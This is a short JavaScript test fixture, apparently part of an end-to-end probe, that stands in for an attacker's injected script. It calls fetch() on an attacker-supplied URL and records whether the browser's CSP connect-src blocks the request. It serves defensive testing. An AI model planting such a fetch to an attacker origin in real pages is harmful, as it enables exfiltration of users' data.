// Injected-script exfil simulation (Issue #11 / ASI02 E2E probe).
//
// Stands in for "an attacker got script execution in the page" (XSS, a
// compromised dependency, malicious rendered content, ...). The ONLY thing
// under test is whether the browser's own CSP `connect-src` enforcement
// stops this script from reaching a non-allowlisted origin — nothing here
// is app logic, this is deliberately the simplest possible payload.
(function () {
  'use strict';
  const status = document.getElementById('status');
  const attackerUrl = new URLSearchParams(location.search).get('attacker');

  window.__result = { fetchOutcome: null, cspViolation: null, done: false };

  // A real CSP-connect-src block fires a `securitypolicyviolation` event on
  // the document *and* rejects the fetch promise. We record both signals so
  // the runner can tell "blocked by CSP" apart from "blocked by something
  // else" (e.g. a network error would also reject the promise).
  document.addEventListener('securitypolicyviolation', (e) => {
    if (e.violatedDirective && e.violatedDirective.startsWith('connect-src')) {
      window.__result.cspViolation = {
        violatedDirective: e.violatedDirective,
        blockedURI: e.blockedURI,
      };
    }
  });

  fetch(attackerUrl, { mode: 'no-cors' })
    .then(() => {
      window.__result.fetchOutcome = 'resolved';
    })
    .catch((err) => {
      window.__result.fetchOutcome = 'rejected:' + (err && err.message);
    })
    .finally(() => {
      // Bounded settle window: the securitypolicyviolation event is async
      // and can arrive a tick after the fetch promise settles.
      setTimeout(() => {
        window.__result.done = true;
        status.dataset.state = 'done';
      }, 300);
    });
})();
